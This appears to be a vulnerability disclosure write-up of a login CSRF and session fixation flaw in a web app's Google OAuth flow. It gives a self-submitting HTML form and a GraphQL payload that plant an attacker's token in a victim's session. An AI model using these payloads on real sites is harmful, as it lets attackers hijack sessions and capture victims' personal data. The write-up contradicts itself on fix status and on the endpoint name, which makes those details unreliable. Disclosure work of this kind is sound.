# 🛂 Google OAuth CSRF – Session Fixation

**Severity:** Medium  
**Status:** Resolved  
**Test Type:** OAuth flow tampering & CSRF  
**Bug Type:** CSRF + Session Fixation via Google Social Login

---

## 🧠 Summary

The app's Google authentication flow was vulnerable to a **CSRF attack**, allowing an attacker to force-login a victim using a an attacker's social auth token.

By tricking the victim into submitting a crafted form (CSRF) containing a valid `token` and `clientState`, the attacker could implant their session into the victim’s browser. This was possible due to improper validation of OAuth tokens and absence of CSRF protections in both:

- The `POST` request after Google redirects with the OAuth token
- The subsequent GraphQL mutation handling the token exchange

---

## 🚨 Exploited Endpoints

1. **`/authentication`**
2. **GraphQL Mutation:** `AuthenticationToken`

---

## 💥 Exploitation Flow

1. Attacker obtains their own valid Google OAuth token (`token`) by starting the login process.

2. Attacker crafts a malicious HTML form:

```
<form action="https://target.com/authorization" method="POST">
  <input type="hidden" name="token" value="ATTACKER_TOKEN">
  <input type="hidden" name="clientState" value="value">
</form>
<script>
  document.forms[0].submit();
</script>
```

3. Victim visits the attacker-controlled site. Their browser sends the attacker’s token to the backend.

4. The backend accepts the token and logs the victim in under the attacker’s session — or processes their actions under attacker identity.

5. The same exploit could be done via GraphQL mutation using:

```
{
  "operationName": "AuthenticationToken",
  "variables": {
    "input": {
      "AuthenticationToken": "ATTACKER_TOKEN",
    }
  }
}
```

## 🔥 Impact
- Session Fixation via third-party auth (Google)
- Login CSRF with full account access via OAuth
- Victim’s PII (full name, email) sent to attacker’s account
- Any action taken post-login (e.g., checkout) stored under attacker session

---

🧩 Disclosure Timeline
- Reported: Feb 2025
- Fixed: Unresolved
- Reports: 2 as the same issue affected the main app and the api


